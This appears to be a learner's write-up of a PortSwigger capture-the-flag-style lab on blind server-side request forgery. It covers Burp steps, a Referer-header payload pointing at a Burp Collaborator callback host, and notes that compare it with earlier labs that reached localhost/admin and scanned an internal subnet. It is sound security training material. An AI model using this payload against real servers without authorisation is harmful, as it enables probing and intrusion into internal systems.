// PortSwigger Labs ---> Platform
---
## Lab: 3 — Blind SSRF With Out-of-Band Detection
## Difficulty Level : 🟡 PRACTITIONER

---

### Where I Found Vulnerability?
- **URL:** `/product?productId=1`
- **Parameter:** `Referer` Header ← Not a normal input field, it's an HTTP Header

---

### Steps?
1. Open any product page and intercept request in Burp
2. Find the `Referer` header in the intercepted request
3. Replace Referer value with your **Burp Collaborator URL**
4. Forward the request
5. Go to Burp Collaborator → Click **Poll Now**
6. DNS/HTTP interaction came → Blind SSRF Confirmed ✅

---

### Working Payload?
```
Referer: https://YOUR-ID.burpcollaborator.net
```

---

### Why it Worked?
- The server was fetching the `Referer` header's URL **in the background**
- This fetch response is not shown to the user — that's why it's **Blind SSRF**
- Burp Collaborator is a public server that records incoming requests
- When the server fetched the Collaborator URL → we got a ping/callback
- The normal user didn't see any response — only a trace on Collaborator

---

### What I Learned?
- In Blind SSRF, the response isn't directly visible — **out-of-band detection** is necessary
- The `Referer` header can also be an SSRF entry point — not just URL parameters
- Burp Collaborator / interactsh confirm server callbacks
- If a DNS/HTTP ping comes to Collaborator → SSRF confirmed, no matter what the response is
- **Basic SSRF vs Blind SSRF:**

| | Basic SSRF | Blind SSRF |
|--|------------|------------|
| Response visible? | ✅ Yes | ❌ No |
| Detection method | Direct response | Out-of-band (Collaborator) |
| Harder to find? | Easy | Hard |

---

### Difficulty Comparison?
```
Lab 1 → localhost/admin          (Basic - Response visible)
Lab 2 → 192.168.0.x scan        (Basic - Response visible)
Lab 3 → Referer + Collaborator  (Blind - No response) ← Harder
```
